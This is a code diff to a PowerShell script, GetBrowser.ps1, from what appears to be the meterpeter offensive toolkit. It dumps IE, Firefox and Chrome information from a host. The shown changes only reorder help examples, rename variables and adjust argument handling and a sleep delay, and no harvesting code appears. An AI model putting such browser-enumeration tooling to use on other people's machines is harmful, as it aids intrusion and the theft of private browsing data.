@@ -13,12 +13,12 @@
    Folder. Unless this script 2º argument its used to input another LogFile storage location.
 
 .EXAMPLE
-   PS C:\> ./GetBrowser.ps1 -ALL
-   Enumerates Internet Explorer (IE), FireFox and Chrome Browsers info.
-
-.EXAMPLE
    PS C:\> ./GetBrowser.ps1 -HELP
    Displays GetBrowser.ps1 help description.
+
+.EXAMPLE
+   PS C:\> ./GetBrowser.ps1 -ALL
+   Enumerates Internet Explorer (IE), FireFox and Chrome Browsers info.
 
 .EXAMPLE
    PS C:\> ./GetBrowser.ps1 -FIREFOX
@@ -39,24 +39,23 @@
 .LINK 
     https://github.com/r00t-3xp10it/meterpeter
     https://github.com/r00t-3xp10it/meterpeter/blob/master/mimiRatz/GetBrowser.ps1
+
+NOTE: |select-object -Property "hash"
 #>
 
 
-## NOTE: |select-object -Property "hash"
-
-
-$RFP = $null
 $IPATH = pwd
 $Path = $null
 $JsPrefs = $null
-$RegPrefs = $null
+$IEVersion = $null
+$IEHistory = $null
 $ParsingData = $null
-$param1 = $args[0] # User Args
-$param2 = $args[1] # User Args
-## Auto-Set @Args in the case of User empty inputs (LogFile Path).
+$param1 = $args[0] # User Inputs [Arguments]
+$param2 = $args[1] # User Inputs [Arguments]
+## Auto-Set @Args in case of User empty inputs (Set LogFile Path).
 If(-not($param2)){$LogFilePath = "$env:TMP"}else{$LogFilePath = "$param2"}
 If(-not($param1)){
-   ## Required (obrigatory) Parameters Settings
+   ## Required (Mandatory) Parameters Settings
    echo "`nGetBrowser - Dump Local-Host Browsers Information." > $LogFilePath\BrowserEnum.log
    echo "[ ERROR ] This Script Requires Parameters (Args) to Run .." >> $LogFilePath\BrowserEnum.log
    echo "`n[Example] ./GetBrowser.ps1 -IE" >> $LogFilePath\BrowserEnum.log
@@ -65,7 +64,7 @@ If(-not($param1)){
    echo "[Example] ./GetBrowser.ps1 -CHROME" >> $LogFilePath\BrowserEnum.log
    echo "[Example] ./GetBrowser.ps1 -FIREFOX" >> $LogFilePath\BrowserEnum.log
    Get-Content $LogFilePath\BrowserEnum.log;Remove-Item $LogFilePath\BrowserEnum.log -Force
-   Start-Sleep -Seconds 8;exit
+   Start-Sleep -Seconds 6;exit
 }
 
 
